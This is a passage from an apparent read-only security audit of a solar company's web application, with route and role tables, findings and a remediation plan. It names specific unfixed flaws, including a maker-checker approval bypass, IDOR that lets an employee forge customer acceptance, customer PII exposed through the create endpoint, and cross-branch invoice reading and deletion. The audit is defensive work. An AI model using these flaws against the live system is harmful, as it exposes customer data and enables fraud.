| **POST** | `/api/admin/enquiries/status` | `BRANCH_MANAGER` | **Yes** | No | Role mismatch (`requireBranchManager` on `/api/admin/`) |
| **POST** | `/api/admin/quotations/save` | `requireAuth` | **Yes** | No | **Missing role requirement: Any logged user can call** |
| **POST** | `/api/admin/invoices/save` | `BRANCH_MANAGER` | **Yes** | No | Role mismatch (`requireBranchManager` on `/api/admin/`) |
| **POST** | `/api/admin/invoices/delete` | `BRANCH_MANAGER` | **Yes** | No | **CRITICAL: Branch Manager can delete any invoice (SEC-05)** |
| **POST** | `/api/admin/users/create` | `SUPER_ADMIN` | **Yes** | No | Staff onboarding |
| **POST** | `/api/admin/users/status` | `BRANCH_MANAGER` | **Yes** | No | Role mismatch (`requireBranchManager` alters user status) |
| **POST** | `/api/admin/users/reset-password` | `SUPER_ADMIN` | **Yes** | No | Admin password reset |
| **POST** | `/api/admin/employees/assign-manager` | `SUPER_ADMIN` | **Yes** | No | Hierarchy assignment |
| **GET** | `/manager/dashboard` | `BRANCH_MANAGER` | N/A | No | Branch Dashboard |
| **GET** | `/manager/employees` | `BRANCH_MANAGER` | N/A | No | Branch staff directory |
| **GET** | `/manager/attendance` | `BRANCH_MANAGER` | N/A | No | Branch attendance logs |
| **GET** | `/manager/quotations` | `BRANCH_MANAGER` | N/A | No | **Branch leak on search query (SEC-03)** |
| **GET** | `/manager/quotations/new` | `BRANCH_MANAGER` | N/A | No | Request form |
| **POST** | `/manager/quotations/new` | `BRANCH_MANAGER` | **Yes** | No | Create quotation request |
| **GET** | `/manager/quotations/request/:id` | `BRANCH_MANAGER` | N/A | No | Request details |
| **POST** | `/manager/quotations/request/:id/status` | `BRANCH_MANAGER` | **Yes** | No | **Missing branch check** |
| **GET** | `/manager/quotations/prepare/:requestId` | `BRANCH_MANAGER` | N/A | No | **Missing branch check** |
| **POST** | `/manager/quotations/preview-financials` | `BRANCH_MANAGER` | **NO** | No | **Missing verifyCsrf** |
| **POST** | `/manager/quotations/save-prepared` | `BRANCH_MANAGER` | **Yes** | No | **CRITICAL: Maker-Checker bypass (SEC-01)** |
| **GET** | `/manager/quotations/:id` | `BRANCH_MANAGER` | N/A | No | Quotation detail |
| **GET** | `/manager/quotations/:id/document` | `BRANCH_MANAGER` | N/A | No | Quotation print |
| **POST** | `/manager/quotations/:id/approve` | `BRANCH_MANAGER` | **Yes** | No | Approval endpoint |
| **POST** | `/manager/quotations/:id/reject` | `BRANCH_MANAGER` | **Yes** | No | Rejection endpoint |
| **GET** | `/manager/projects` | `BRANCH_MANAGER` | N/A | No | Branch projects |
| **GET** | `/manager/projects/:id` | `BRANCH_MANAGER` | N/A | No | Project detail workspace |
| **POST** | `/manager/projects/:id/status` | `BRANCH_MANAGER` | **Yes** | No | Project milestone update |
| **POST** | `/manager/projects/:id/site-visit/review` | `BRANCH_MANAGER` | **Yes** | No | Survey review |
| **POST** | `/manager/projects/:id/tasks` | `BRANCH_MANAGER` | **Yes** | No | Task creation |
| **POST** | `/manager/projects/:id/tasks/:taskId/status` | `BRANCH_MANAGER` | **Yes** | No | Task status |
| **POST** | `/manager/projects/:id/assign` | `BRANCH_MANAGER` | **Yes** | No | Engineer assignment |
| **POST** | `/manager/projects/:id/materials/:materialId` | `BRANCH_MANAGER` | **Yes** | No | Material allocation |
| **POST** | `/manager/projects/:id/complete` | `BRANCH_MANAGER` | **Yes** | No | Commissioning completion |
| **POST** | `/manager/projects/:id/documents` | `BRANCH_MANAGER` | **Yes** | No | Document upload |
| **GET** | `/manager/projects/:id/documents/:documentId` | `BRANCH_MANAGER` | N/A | No | Document download |
| **GET** | `/manager/invoices` | `BRANCH_MANAGER` | N/A | No | **CRITICAL: Leaks ALL enterprise invoices (SEC-04)** |
| **GET** | `/manager/profile` | `BRANCH_MANAGER` | N/A | No | Profile page |
| **GET** | `/manager/enquiries` | `BRANCH_MANAGER` | N/A | No | Enquiries dashboard |
| **GET** | `/manager/complaints` | `BRANCH_MANAGER` | N/A | No | Complaints dashboard |
| **GET** | `/manager/reports` | `BRANCH_MANAGER` | N/A | No | Reports dashboard |
| **GET** | `/employee`, `/employee/dashboard` | `EMPLOYEE` | N/A | No | Employee workspace |
| **GET** | `/employee/attendance` | `EMPLOYEE` | N/A | No | Punch attendance page |
| **POST** | `/api/attendance` | `EMPLOYEE` | **Yes** | No | In-memory only; no geofence (SEC-11) |
| **GET** | `/employee/quotations` | `EMPLOYEE` | N/A | No | Employee quotations |
| **GET** | `/employee/quotations/new`, `/quotations/new`| `EMPLOYEE` | N/A | No | Request form |
| **POST** | `/employee/quotations/new`, `/quotations/new`| `EMPLOYEE` | **Yes** | No | Create quotation request |
| **GET** | `/employee/quotations/request/:id` | `EMPLOYEE` | N/A | No | Request details |
| **POST** | `/employee/quotations/request/:id/resubmit` | `EMPLOYEE` | **Yes** | No | Resubmit draft |
| **GET** | `/employee/quotations/:id` | `EMPLOYEE` | N/A | No | Quotation detail |
| **GET** | `/employee/quotations/:id/document` | `EMPLOYEE` | N/A | No | PDF view |
| **POST** | `/employee/quotations/:id/customer-response` | `EMPLOYEE` | **Yes** | No | **CRITICAL IDOR: Triggers project creation (SEC-02)** |
| **GET** | `/employee/projects` | `EMPLOYEE` | N/A | No | Assigned projects list |
| **GET** | `/employee/projects/:id` | `EMPLOYEE` | N/A | No | Project detail workspace |
| **POST** | `/employee/projects/:id/status` | `EMPLOYEE` | **Yes** | No | Update status |
| **POST** | `/employee/projects/:id/site-visit` | `EMPLOYEE` | **Yes** | No | Submit site survey |
| **POST** | `/employee/projects/:id/tasks/:taskId/status`| `EMPLOYEE` | **Yes** | No | Update task status |
| **POST** | `/employee/projects/:id/documents` | `EMPLOYEE` | **Yes** | No | Upload project document |
| **GET** | `/employee/projects/:id/documents/:documentId` | `EMPLOYEE` | N/A | No | Download project document |
| **GET** | `/employee/profile` | `EMPLOYEE` | N/A | No | Employee profile view |
| **GET** | `/api/customers/search` | `requireAuth` | N/A | No | Search customer by mobile |
| **POST** | `/api/customers/create` | `requireAuth` | **Yes** | No | **HIGH IDOR: Exfiltrates customer PII (SEC-06)** |
| **POST** | `/private/projects/:id/documents` | `requireAuth` | **Yes** | No | Cross-role document upload alias |
| **GET** | `/private/projects/:id/documents/:documentId` | `requireAuth` | N/A | No | Cross-role document download alias |
| **GET** | `/quotations/:id` | `requireAuth` | N/A | No | Cross-role quotation detail alias |
| **GET** | `/quotations/:id/document` | `requireAuth` | N/A | No | Cross-role quotation print alias |
| **GET** | `/attachments/:filename` | `requireAuth` | N/A | No | **HIGH IDOR: Unrestricted Cloudinary redirect (SEC-07)** |

---

## 3. ROLE-WISE ACCESS CONTROL MATRIX

The system defines four user roles in `models/User.js`: `SUPER_ADMIN`, `MANAGER`, `BRANCH_MANAGER`, and `EMPLOYEE`, in addition to unauthenticated `GUEST`.

| Functional Domain / Action | SUPER_ADMIN | MANAGER | BRANCH_MANAGER | EMPLOYEE | GUEST | Notes / Identified Flaws |
| :--- | :---: | :---: | :---: | :---: | :---: | :--- |
| **Public Website & Calculators** | Full | Full | Full | Full | Full | Static pages & solar calculation |
| **Submit Public Inquiries** | Full | Full | Full | Full | Full | Rate-limited enquiry API |
| **Submit / Track Complaints** | Full | Full | Full | Full | Full | Missing rate limit; mock 404 behavior |
| **Sign In / Single Sign-On** | Full | Full | Full | Full | Full | Protected by 5 failed-attempt lockout |
| **Punch Attendance** | N/A | View | View | Full | None | Bypasses geofence; in-memory only |
| **View Audit Logs** | Full | None | None | None | None | Stored in MongoDB `AuditLog` |
| **Create New Staff / Users** | Full | None | None | None | None | `/api/admin/users/create` |
| **Reset User Passwords** | Full | None | None | None | None | Super Admin exclusive |
| **Modify User Status** | Full | **Allowed** | **Allowed** | None | None | Role mismatch in `superadminroutes.js#L70` |
| **Assign Employee Manager** | Full | None | None | None | None | Super Admin exclusive |
| **Create Quotation Request** | Full | Full | Full | Full | None | All authenticated staff |
| **Search Quotations** | Full | **Cross-Branch Leak** | **Cross-Branch Leak** | Own | None | Overwritten `$or` clause in search (SEC-03) |
| **Prepare Quotations (BOM/Calc)** | Full | Full | Full | None | None | Managers & Admins only |
| **Direct Quotation Self-Approval**| Full | **Vulnerable** | **Vulnerable** | None | None | Maker-checker bypass (SEC-01) |
| **Maker-Checker Approve Quotation**| Full | Branch Only | Branch Only | None | None | Proper check in `approveQuotation` |
| **Record Customer Acceptance** | Full | Full | Full | **Unrestricted**| Token | IDOR in employee endpoint (SEC-02) |
| **Automatic Project Initialization**| Full | Full | Full | **Triggerable** | Token | Triggered automatically on acceptance |
| **View Projects** | Full | Branch Only | Branch Only | Assigned | None | Properly isolated in `ProjectService` |
| **Update Project Status** | Full | Branch Only | Branch Only | Assigned | None | Strict state transitions enforced |
| **Submit Site Survey** | Full | Branch Only | Branch Only | Assigned | None | Captures technical electrical survey |
| **Review Site Survey** | Full | Branch Only | Branch Only | None | None | Manager approval required |
| **Assign Project Engineers** | Full | Branch Only | **All Staff** | None | None | Role distinction bug in `projectController.js#L110` |
| **View Invoices** | Full | **All Invoices** | **All Invoices** | None | None | Zero branch isolation in `getInvoices` (SEC-04) |
| **Delete Invoices** | Full | **Allowed** | **Allowed** | None | None | Any manager can delete any invoice (SEC-05) |
| **View Customer Records** | Full | Branch Only | Branch Only | Assigned | None | Search masked, but `createCustomer` leaks (SEC-06) |
| **Download Attachments** | Full | **Any File** | **Any File** | **Any File** | None | Missing authorization check (SEC-07) |

---

## 4. BRANCH ISOLATION ASSESSMENT

### Current Status: PARTIALLY IMPLEMENTED / COMPROMISED
Branch isolation was intentionally designed into the data model (`branchId` in `User`, `branch` in `Customer`, `Quotation`, `QuotationRequest`, `Project`, and `Invoice`). However, systemic gaps compromise branch isolation at the controller and route layer:

1. **`requireBranchAccess` Middleware Inactive:**  
   The helper function designed to reject requests when `user.branchId !== req.params.branchId` is never called.
2. **Quotation Search Bypass:**  
   Querying `?search=` completely erases branch isolation clauses in `quotationController.js#L446`.
3. **Unfiltered Financial Data:**  
   `managerController.js#L213` performs `Invoice.find({})`, exposing corporate financial data across regional branches.
4. **Cross-Branch Mutation:**  
   `POST /manager/quotations/request/:id/status` and `POST /api/admin/invoices/delete` execute updates without validating that the target record belongs to the manager's branch.

---

## 5. OBJECT-LEVEL AUTHORIZATION (IDOR) ASSESSMENT

### Current Status: HIGH RISK
The application relies heavily on route-level role checks (`requireEmployee`, `requireBranchManager`) without consistent object-level ownership checks:

1. **Customer Response IDOR (SEC-02):**  
   Any authenticated employee can forge customer acceptance on any quotation across the company, automatically spinning up work orders.
2. **Customer PII Exfiltration (SEC-06):**  
   Submitting an existing customer's 10-digit mobile number to `POST /api/customers/create` returns the complete customer record, bypassing the privacy mask enforced in `searchByMobile`.
3. **Quotation Document & Attachment Access (SEC-07):**  
   `GET /attachments/:filename` does not verify if the requesting user belongs to the assigned branch or project team, leaking documents directly via public Cloudinary URLs.
4. **Invoice Deletion IDOR (SEC-05):**  
   Passing any `invoiceNumber` to `/api/admin/invoices/delete` deletes the target invoice regardless of branch ownership.

---

## 6. UPLOAD & DOWNLOAD SECURITY ASSESSMENT

### Current Status: MIXED (Strong Validation, Insecure Storage Access)

### Strengths:
- **Magic-Byte Signature Inspection:** `services/uploadService.js` strictly inspects file header bytes for JPEG (`FF D8 FF`), PNG (`89 50 4E 47...`), PDF (`25 50 44 46`), and WEBP (`RIFF...WEBP`). Fake extension spoofing is reliably blocked.
- **Strict Size Limits:** Enforces a 5 MB buffer limit per file and restricts uploads to 5 items per request.
- **Unguessable Random Identifiers:** Files are assigned UUID-based storage filenames (`crypto.randomUUID()`), mitigating local path traversal.
- **Zero Local Disk Writes:** All files stream directly to Cloudinary buffers; no executable files are stored in local web-accessible folders.

### Vulnerabilities:
- **Public Cloudinary Asset Exposure:** Cloudinary uploads lack `type: 'authenticated'`. Anyone possessing the CDN URL can view customer utility bills and identity documents indefinitely without authentication.
- **Insecure Redirection:** `serveAttachment` redirects users to public CDN URLs without object-level permission verification.

---

## 7. PRODUCTION DEPLOYMENT READINESS ASSESSMENT

| Audit Parameter | Current Configuration | Production Recommendation | Risk Level |
| :--- | :--- | :--- | :--- |
| **Secrets Management** | Plaintext credentials in local `.env` | Inject via Render environment secrets / AWS Secrets Manager; rotate immediately | **HIGH** |
| **Session Secret** | Hardcoded fallback in `server.js` | Disallow server startup if `SESSION_SECRET` is unset in production | **MEDIUM** |
| **Cookie Security** | `secure: process.env.NODE_ENV === 'production'` | Ensure `NODE_ENV=production` is strictly set on Render; set `sameSite: 'lax'` | **LOW** |
| **Session Store** | Connect-Mongo backed by MongoDB | Configured correctly with 14-day TTL and native cleanup | **LOW** |
| **Content Security Policy** | `contentSecurityPolicy: false` | Configure strict CSP with nonces for inline calculators | **HIGH** |
| **Error Handling** | Generic message returned in production | Stack traces are hidden in production; internal details properly masked | **SECURE** |
| **Database Connection** | SSL/TLS enabled (`retryWrites=true&w=majority`) | MongoDB Atlas connection configured with SSL; credentials must be rotated | **LOW** |
| **Audit Logging** | Centralized `AuditService` writing to MongoDB | Logs login failures, status changes, and unauthorized attempts effectively | **SECURE** |
| **Rate Limiting** | Active on `/login` and `/api/enquiry` | Expand rate limiting to complaints, franchise forms, and token acceptance | **MEDIUM** |

---

## 8. FILES INSPECTED DURING AUDIT

### Core Server & Configuration
- [server.js](file:///c:/rid/solar_panial/server.js)
- [config/database.js](file:///c:/rid/solar_panial/config/database.js)
- [config/cloudinary.js](file:///c:/rid/solar_panial/config/cloudinary.js)
- [config/company.js](file:///c:/rid/solar_panial/config/company.js)
- [.env](file:///c:/rid/solar_panial/.env)
- [.env.example](file:///c:/rid/solar_panial/.env.example)
- [.gitignore](file:///c:/rid/solar_panial/.gitignore)

### Middleware
- [middleware/authMiddleware.js](file:///c:/rid/solar_panial/middleware/authMiddleware.js)
- [middleware/rateLimiters.js](file:///c:/rid/solar_panial/middleware/rateLimiters.js)

### Routes
- [routes/webRoutes.js](file:///c:/rid/solar_panial/routes/webRoutes.js)
- [routes/publicroute/publicroutes.js](file:///c:/rid/solar_panial/routes/publicroute/publicroutes.js)
- [routes/privateroute/authroutes.js](file:///c:/rid/solar_panial/routes/privateroute/authroutes.js)
- [routes/privateroute/superadminroutes.js](file:///c:/rid/solar_panial/routes/privateroute/superadminroutes.js)
- [routes/privateroute/managerroutes.js](file:///c:/rid/solar_panial/routes/privateroute/managerroutes.js)
- [routes/privateroute/employeeroutes.js](file:///c:/rid/solar_panial/routes/privateroute/employeeroutes.js)

### Controllers
- [controllers/authController.js](file:///c:/rid/solar_panial/controllers/authController.js)
- [controllers/adminController.js](file:///c:/rid/solar_panial/controllers/adminController.js)
- [controllers/managerController.js](file:///c:/rid/solar_panial/controllers/managerController.js)
- [controllers/employeeController.js](file:///c:/rid/solar_panial/controllers/employeeController.js)
- [controllers/customerController.js](file:///c:/rid/solar_panial/controllers/customerController.js)
- [controllers/quotationController.js](file:///c:/rid/solar_panial/controllers/quotationController.js)
- [controllers/projectController.js](file:///c:/rid/solar_panial/controllers/projectController.js)
- [controllers/pageController.js](file:///c:/rid/solar_panial/controllers/pageController.js)
- [controllers/complaintController.js](file:///c:/rid/solar_panial/controllers/complaintController.js)
- [controllers/franchiseController.js](file:///c:/rid/solar_panial/controllers/franchiseController.js)

### Services
- [services/auditService.js](file:///c:/rid/solar_panial/services/auditService.js)
- [services/projectService.js](file:///c:/rid/solar_panial/services/projectService.js)
- [services/quotationService.js](file:///c:/rid/solar_panial/services/quotationService.js)
- [services/uploadService.js](file:///c:/rid/solar_panial/services/uploadService.js)
- [services/dataStore.js](file:///c:/rid/solar_panial/services/dataStore.js)

### Models
- [models/User.js](file:///c:/rid/solar_panial/models/User.js)
- [models/Branch.js](file:///c:/rid/solar_panial/models/Branch.js)
- [models/Customer.js](file:///c:/rid/solar_panial/models/Customer.js)
- [models/Attendance.js](file:///c:/rid/solar_panial/models/Attendance.js)
- [models/Quotation.js](file:///c:/rid/solar_panial/models/Quotation.js)
- [models/QuotationRequest.js](file:///c:/rid/solar_panial/models/QuotationRequest.js)
- [models/QuotationStatusHistory.js](file:///c:/rid/solar_panial/models/QuotationStatusHistory.js)
- [models/Project.js](file:///c:/rid/solar_panial/models/Project.js)
- [models/ProjectActivity.js](file:///c:/rid/solar_panial/models/ProjectActivity.js)
- [models/ProjectNote.js](file:///c:/rid/solar_panial/models/ProjectNote.js)
- [models/Invoice.js](file:///c:/rid/solar_panial/models/Invoice.js)
- [models/AuditLog.js](file:///c:/rid/solar_panial/models/AuditLog.js)
- [models/Complaint.js](file:///c:/rid/solar_panial/models/Complaint.js)
- [models/Counter.js](file:///c:/rid/solar_panial/models/Counter.js)

### Views Inspected
- `views/private/admin/invoices.ejs`
- `views/private/admin/quotations.ejs`
- `views/private/manager/quotations.ejs`
- `views/private/employee/quotations.ejs`
- `views/private/projects/detail.ejs`
- `views/private/auth/admin-login.ejs`
- `views/public-site/complaints.ejs`
- `views/public-site/franchise.ejs`

### Existing Tests Evaluated
- [tests/security.test.js](file:///c:/rid/solar_panial/tests/security.test.js)
- [tests/phase1.test.js](file:///c:/rid/solar_panial/tests/phase1.test.js)
- [tests/phase2.test.js](file:///c:/rid/solar_panial/tests/phase2.test.js)
- [tests/phase3.test.js](file:///c:/rid/solar_panial/tests/phase3.test.js)

### Files Not Inspected:
None. All application routes, controllers, middleware, models, services, views, and test suites within the workspace repository were inspected.

---

## 9. EXISTING TEST COVERAGE & SECURITY GAPS

The existing test suites (`tests/security.test.js`, `phase1.test.js`, `phase2.test.js`, `phase3.test.js`) execute unit-style assertions against isolated mock functions. While useful for verifying happy-path role checks and schema constraints, significant test coverage gaps exist:

1. **Zero HTTP Integration Testing:**  
   Tests do not run an active HTTP server or use integration tools like SuperTest. They test middleware in isolation (`requireAuth(req, res, next)`) using hardcoded mock objects, failing to detect route-level ordering and mounting discrepancies.
2. **Untested Complex Query Semantics:**  
   No tests verify what happens when multiple filters (`search`, `statusFilter`, `employeeFilter`) are combined in `quotationController.js`. The search `$or` overwrite bug (SEC-03) went undetected because tests only provided static single-parameter queries.
3. **Untested Maker-Checker Creation Flow:**  
   Tests verify `approveQuotation` maker-checker rules, but do not test `prepareQuotation` with `directApprove: true` (SEC-01).
4. **No IDOR Mutation Tests:**  
   There are no automated tests that attempt to submit customer responses (SEC-02), delete invoices (SEC-05), or create existing customers (SEC-06) from an unauthorized user account.
5. **No XSS or Template Output Tests:**  
   No test suite verifies HTML escaping or script context escaping within EJS views.

---

## 10. PRIORITIZED REMEDIATION PLAN

### Phase P0 — Critical Immediate Fixes (Remediate First)
1. **Fix Maker-Checker Bypass (SEC-01):**  
   Remove `directApprove` logic from `QuotationService.prepareQuotation` for non-SuperAdmin roles. Always enforce initial status `PENDING_APPROVAL`.
2. **Close Customer Response IDOR & Project Creation Bypass (SEC-02):**  
   Enforce branch and assignment verification in `postCustomerResponse` and `recordCustomerResponse`. Disallow arbitrary employees from accepting quotations and initiating projects.
3. **Fix Branch Isolation Overwrite in Quotation Search (SEC-03):**  
   Refactor `getManagerQuotations` to combine branch isolation and search criteria using `$and`.
4. **Isolate Branch Manager Invoices & Projects (SEC-04):**  
   Add `{ branch: sessionUser.branchId }` to all database queries in `managerController.getInvoices`.
5. **Secure Invoice Deletion API (SEC-05):**  
   Restrict `POST /api/admin/invoices/delete` strictly to `SUPER_ADMIN`, and activate `requireBranchAccess` across branch-specific endpoints.

### Phase P1 — High-Priority Security Fixes
1. **Fix Customer PII Exfiltration in `createCustomer` (SEC-06):**  
   Sanitize responses when existing customers are matched. Do not expose full addresses, DISCOM details, or allow blind field overwrites without ownership verification.
2. **Secure Cloudinary Asset Storage & Attachment Serving (SEC-07):**  
   Upload sensitive documents with `type: 'authenticated'` and issue short-lived signed URLs in `serveAttachment` only after verifying user branch access.
3. **Remediate Stored XSS in EJS Templates (SEC-08):**  
   Replace `<%- JSON.stringify(...) %>` inside `<script>` blocks with HTML-escaped data attributes (`data-invoices="..."`), and re-enable Helmet Content Security Policy with nonces.
4. **Rotate Production Secrets & Harden Session Fallback (SEC-09):**  
   Rotate MongoDB Atlas user credentials and Cloudinary API secret; enforce hard failure on startup if `SESSION_SECRET` is missing.

### Phase P2 — Medium-Priority Fixes
1. **Harden CSRF Protection (SEC-10):**  
   Remove `req.query._csrf` acceptance from `verifyCsrf`. Add `verifyCsrf` to `/preview-financials`. Convert `/logout` to POST only.
2. **Implement Geofence Checking & MongoDB Attendance Persistence (SEC-11):**  
   Compute distance against `branch.coordinates` and persist attendance records in MongoDB using the `Attendance` model.
3. **Normalize `MANAGER` and `BRANCH_MANAGER` in Controllers (SEC-12):**  
   Update `projectController.js` to treat both role strings equivalently when querying branch employees.

### Phase P3 — Low-Priority Improvements
1. **Query Selector Sanitization (SEC-13):**  
   Add `express-mongo-sanitize` to reject NoSQL injection operators in request bodies and query parameters.
2. **Remove Phantom Complaint Fallback (SEC-14):**  
   Return standard 404 responses for non-existent ticket lookups in `complaintController.trackComplaint`.
3. **Public API Rate Limiting:**  
   Apply rate limiters to `POST /api/complaints`, `POST /api/franchise`, and `POST /quotation/accept/:token`.

---

## AUDIT CONCLUSION & SIGN-OFF

This security audit was conducted strictly in **READ-ONLY** mode in accordance with explicit audit guidelines. **No code, database schemas, configurations, or views have been modified.**

To implement any of the defensive remediations outlined in the P0–P3 roadmap, please review this report and provide explicit authorization to proceed with code modifications.
